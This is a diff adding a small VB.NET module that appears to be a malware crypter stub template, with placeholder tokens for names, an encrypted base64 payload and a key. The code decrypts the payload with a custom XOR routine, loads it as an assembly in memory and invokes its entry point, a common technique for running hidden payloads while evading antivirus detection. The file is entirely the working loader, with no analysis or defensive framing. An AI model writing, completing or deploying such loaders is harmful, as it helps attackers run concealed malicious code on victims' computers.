@@ -1,0 +1,37 @@
+Imports System.Security.Cryptography
+Imports System.Text
+
+Module omar_iraq
+
+
+    Sub main()
+
+        Dim %1% As String = "%2%"
+
+
+
+
+        Dim %3% As Byte() = %5%(Convert.FromBase64String(%1%), "%8%")
+
+
+
+
+
+        Dim %4% As System.Reflection.Assembly = System.Reflection.Assembly.Load(%3%)
+        %4%.EntryPoint.Invoke(Nothing, Nothing)
+
+
+    End Sub
+   Public Function %5%(ByVal BB As Byte(), ByVal CC As String) As Byte()
+        Dim AA As Byte() = System.Text.Encoding.ASCII.GetBytes(CC)
+        Dim OO As Integer = BB(BB.Length - 1) Xor 112
+        Dim QQ(BB.Length) As Byte
+        Dim JJ As Integer
+        For GG As Integer = 0 To BB.Length - 1
+            QQ(GG) = (BB(GG) Xor OO) Xor AA(JJ)
+            If JJ = CC.Length - 1 Then JJ = 0 Else JJ = JJ + 1
+        Next
+        ReDim Preserve QQ(BB.Length - 2)
+        Return QQ
+    End Function
+End Module
